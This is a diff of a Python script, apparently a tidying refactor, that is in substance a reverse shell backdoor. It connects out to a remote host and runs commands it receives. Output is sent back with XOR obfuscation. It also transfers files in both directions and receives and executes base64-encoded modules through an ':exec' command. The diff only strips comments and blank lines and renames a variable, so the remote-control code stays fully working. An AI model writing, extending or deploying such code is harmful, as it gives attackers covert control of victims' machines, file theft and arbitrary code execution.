@@ -1,15 +1,13 @@
 #!/usr/bin/env python
-#!/usr/bin/env python
-import os, sys, re, signal
+import os, sys, re
 import socket
 import time
 from base64 import *
 from subprocess import Popen,PIPE,STDOUT,call
 
-
 socksize = 4096                            
 activePID = []
-Home_Dir = os.environ['HOME']
+home = os.environ['HOME']
 if os.geteuid() != 0:
     currentuser = "nonroot"
 else:
@@ -76,7 +74,6 @@ def cmd2txt(command, textfile):
 def main(HOST, PORT, pin):
     global connection
     connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
     try:
         connection.connect((HOST, PORT))
         connection.send(xor("shell => ", pin))
@@ -93,7 +90,6 @@ def main(HOST, PORT, pin):
              stdin=PIPE,
              )
         stdout, stderr = proc.communicate()
-
         if cmd.startswith('cd'):
             try:
                 destination = cmd[3:].replace('\n','')
@@ -107,7 +103,6 @@ def main(HOST, PORT, pin):
                     connection.send("shell => ")
             except IndexError:
                 pass
-
         if cmd2.startswith(":upload"):
             getname = cmd2.split(" ")
             rem_file = getname[1]
@@ -121,7 +116,6 @@ def main(HOST, PORT, pin):
                 connection.send(xor("[~] File upload complete!\n", pin))
             if not os.path.isfile(filename):
                 connection.send(xor("[!] File upload failed! Please try again\n", pin))
-
         elif cmd2.startswith(":download"):
             getname = cmd2.split(" ")
             loc_file = getname[1]
@@ -133,28 +127,22 @@ def main(HOST, PORT, pin):
                 connection.sendall(senddata)
             else:
                 connection.send(xor("[!] File not found!", pin))
-    
         elif cmd2.startswith(":exec"):
             try:
-                getname = cmd2.split(" ")        # split mod name from cmd
-                modname = getname[1]            # Parse name of module we are retrieving. Will be used for logging and output purposes
-    
-                mod_data = ""                   # Our received file data will go here 
+                getname = cmd2.split(" ")
+                modname = getname[1]
+                mod_data = ""
                 data = connection.recv(socksize)
                 mod_data += data
-                #print("[+] Module recieved!")
-                connection.send(xor("Complete", pin))     # sends OK msg to the client
-                modexec = b64decode(mod_data)   # decode the received file
-                module_handler(modexec, modname)            # send module to module_handler where it is executed and pipes data back to client
-
+                connection.send(xor("Complete", pin))
+                modexec = b64decode(mod_data)
+                module_handler(modexec, modname)
             except IndexError:
                 pass
-
         elif cmd2 == (":quit"):
             connection.close()
             os._exit(0)
             sys.exit(0)
-
         elif proc:
             connection.send(xor( stdout , pin))
             connection.send(xor("shell => ", pin))
